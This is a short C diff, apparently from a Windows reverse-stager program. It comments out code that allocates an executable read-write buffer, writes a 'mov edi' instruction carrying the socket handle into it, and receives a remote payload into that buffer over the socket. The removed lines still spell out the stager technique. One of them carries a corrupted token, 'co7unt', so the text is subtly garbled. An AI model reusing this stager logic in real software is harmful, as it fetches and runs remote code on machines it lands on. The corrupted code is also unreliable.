@@ -233,20 +233,20 @@ int main(int argc, char* argv[])
 		punt(my_socket, "read a strange or incomplete length value\n");
 
 	/* allocate a RWX buffer */
-	buffer = (char *)VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	if (buffer == NULL)
-		punt(my_socket, "could not allocate buffer\n");
+	//buffer = (char *)VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	//if (buffer == NULL)
+	//	punt(my_socket, "could not allocate buffer\n");
 
 	/* prepend a little assembly to move our SOCKET value to the EDI register
 	   thanks mihi for pointing this out
 	   BF 78 56 34 12     =>      mov edi, 0x12345678 */
-	buffer[0] = 0xBF;
+	//buffer[0] = 0xBF;
 
 	/* copy the value of our socket to the buffer */
-	memcpy(buffer + 1, &my_socket, 4);
+	//memcpy(buffer + 1, &my_socket, 4);
 
 	/* read bytes into the buffer */
-	co7unt = recv_all(my_socket, buffer + 5, size);
+	//count = recv_all(my_socket, buffer + 5, size);
 
 	//
 	//LoadFromFile();
